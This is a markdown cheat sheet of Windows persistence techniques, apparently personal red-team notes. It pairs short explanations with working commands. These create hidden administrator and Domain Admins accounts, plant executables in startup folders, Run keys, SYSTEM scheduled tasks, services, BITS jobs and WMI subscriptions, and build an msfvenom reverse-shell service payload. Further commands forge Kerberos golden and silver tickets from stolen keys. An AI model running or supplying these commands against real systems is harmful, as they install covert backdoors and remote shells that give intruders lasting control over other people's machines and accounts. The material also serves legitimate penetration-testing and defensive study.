# Windows persistence

## Things to remember
  *  Enumerate defenses and choose persistence mechanisms carefully
  *  These methods and more covered on [ired.team](https://www.ired.team/offensive-security/persistence) and [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence)

## Credentials
  *  Credentials are the easiest form of persistence
  *  Any form of credential can often be used
      *  Includes passwords, password hashes, kerberos tickets, etc.
      *  See [lateral movement techniques](https://github.com/SpacemanHenry/hacknotes/blob/main/Post%20Exploitation/Lateral%20Movement/Credentials.md) for examples of code exec using credentials
   *  [Create a new user account](https://www.ired.team/offensive-security/persistence/t1136-create-account) and/or [dump credentials](https://www.ired.team/offensive-security/credential-access-and-credential-dumping)
       *  Local user on a domain controller is a domain user!
       *  Powershell [ActiveDirectory module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) not available on clients by default

```
net user hacker password /add
net localgroup Administrators hacker /add
net user hacker password /add /domain
net group "Domain Admins" hacker /add /domain
```

```
PS > New-LocalUser -Name 'hacker' -Password $(ConvertTo-SecureString -AsPlainText 'password' -Force)
PS > Add-LocalGroupMember -Group 'Administrators' -Member 'hacker'
PS > New-ADUser -Name 'hacker' -AccountPassword $(ConvertTo-SecureString -AsPlainText 'password' -Force)
PS > Add-ADGroupMember -Identity 'Domain Admins' -Members 'hacker'
```

## Startup folder/registry keys
  *  Programs in startup folders and [Run/RunOnce registry keys](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys) are executed on login
  *  [Elevated startup](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/#startup-elevated) folder and [HKLM Run/RunOnce registry keys](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/#registry-hklm) are executed by **all users** on login
      *  Path to file specified in HKLM registry key must be readable by victim
      *  Consider world-readable locations such as the hosts file directory

```
copy evil.exe C:\Users\bob\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
copy evil.exe C:\ProgramData\Microsoft\Windows\"Start Menu"\Programs\Startup
```

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -v ExampleName /t REG_SZ /d "C:\Users\bob\evil.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -v ExampleName /t REG_SZ /d "C:\Windows\System32\drivers\etc\evil.exe"
```

## [Scheduled tasks](https://www.ired.team/offensive-security/persistence/t1053-schtask)
  *  Scheduled tasks execute code on a set schedule (duh)
  *  [`schtasks`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) is capable of many different schedule types
      *  Every minute/hour/day/week/month, on login, at boot time, [and more](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create#parameters)!
  *  `powershell` also provides [cmdlets](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtask?view=windowsserver2022-ps) for [manipulating scheduled tasks](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/#scheduled-tasks-user)

```
schtasks /create /sc minute /tn ExampleName /tr C:\Windows\Temp\evil.exe /ru SYSTEM
schtasks /create /sc onstart /tn ExampleName /tr C:\Windows\Temp\evil.exe /ru SYSTEM
```

```
PS > $action  = New-ScheduledTaskAction -Execute C:\Windows\Temp\evil.exe
PS > $trigger = New-ScheduledTaskTrigger -AtStartup
PS > $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM"
PS > $settings = New-ScheduledTaskSettingsSet
PS > $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
PS > Register-ScheduledTask ExampleName -InputObject $task
```

## [Services](https://www.ired.team/offensive-security/persistence/t1035-service-execution)
  *  Windows services execute code as [long-running background processes](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications)
      *  Services can also be created to tell the [boot loader/kernel init](https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-your-first-driver) to load a device driver!
  *  [Services](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/walkthrough-creating-a-windows-service-application-in-the-component-designer#set-service-status) must interface with the [Service Control Manager](https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager) to avoid errors in event logs
      *  For `msfvenom` payloads the `exe-service` format provides this
  *  [`sc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) utility or [`powershell cmdlet`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-service?view=powershell-7.4) for creating Windows services

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4444 -f exe-service -o evil-service.exe
```

```
sc create ExampleName start=auto binpath="C:\Windows\Temp\evil-service.exe"
```

```
PS > New-Service -Name "ExampleName" -BinaryPathName "C:\Windows\Temp\evil-service.exe"
```

## [BITS Jobs](https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/#bits-jobs)
  *  [BITS](https://learn.microsoft.com/en-us/windows/win32/bits/about-bits) jobs can execute a given command in response to certain events
      *  Failed commands are re-executed after a [delay](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-setminretrydelay) if the job is not completed/cancelled
      *  Payload [must return a non-zero value](https://trustedsec.com/blog/bits-persistence-for-script-kiddies) to indicate an error/failure in order to persist
      *  [Event notification flags](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-setnotifyflags), [timeout](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-setnoprogresstimeout), and invalid files to avoid transfer prior to persistence
  *  [`bitsadmin`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin) utility for configuring BITS jobs

```
bitsadmin /create ExampleName
bitsadmin /addfile ExampleName C:\invalid.1 C:\invalid.2
bitsadmin /setnoprogresstimeout ExampleName 0
bitsadmin /setminretrydelay ExampleName 60
bitsadmin /setnotifyflags ExampleName 2
bitsadmin /setnotifycmdline ExampleName cmd.exe "/c C:\Windows\Temp\evil.exe && fc.exe 2>NUL"
```

## [WMI event subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)
  *  WMI includes an [event notification system](https://learn.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event)
      *  [Filters](https://learn.microsoft.com/en-us/windows/win32/wmisdk/--eventfilter) define events to be notified of using [WMI Query Language (WQL)](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi)
      *  [Consumers](https://learn.microsoft.com/en-us/windows/win32/wmisdk/standard-consumer-classes) perform actions when events are consumed
      *  Filters and consumers are [bound together](https://learn.microsoft.com/en-us/windows/win32/wmisdk/binding-an-event-filter-with-a-logical-consumer) to perform actions based on event subscriptions
  *  Any event provided by WMI can be used as a persistence trigger... [get creative](https://learn.microsoft.com/en-us/windows/win32/wmisdk/querying-with-wql)!
  *  [`powershell cmdlets`](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/?view=powershell-7.4) for creating/binding event filters/consumers
      *  Also supports registering WMI objects on remote machines

// Execute evil.exe every minute
```
PS > $query = "SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
PS > $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name = "ExampleName"; EventNamespace = "root\cimv2"; QueryLanguage = "WQL"; Query = $query;}
PS > $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name = "ExampleName"; ExecutablePath = "C:\Windows\Temp\evil.exe";}
PS > $binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter = [ref]$filter; Consumer = [ref]$consumer;}
```

## [Kerberos golden tickets ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)
  *  Steal `krbtgt` keys and forge valid TGTs
      *  TGTs must be forged [for a valid user](https://blog.netwrix.com/2022/01/10/pacrequestorenforcement-and-kerberos-authentication/)
  *  `impacket` for forging TGTs using stolen keys
      *  Time sync required prior to forging

```
impacket-ticketer -aesKey [KRBTGT KEY] -domain-sid [SID] -domain example.local bob
export KRB5CCNAME=/path/to/ticket.ccache
```

## [Kerberos silver tickets](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
  *  Steal/crack service account keys and forge valid TGSs
      *  Still must be forged for a valid user
      *  Machine account hash for [ST to Windows OS services](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services) (WMI, CIFS, etc.)
  *  `impacket` for forging TGSs using stolen keys
      *  Time sync required prior to forging

```
impacket-ticketer -nthash [SERVICE ACCOUNT HASH] -spn [TARGET SPN] -domain-sid [SID] -domain example.local bob
export KRB5CCNAME=/path/to/ticket.ccache
```
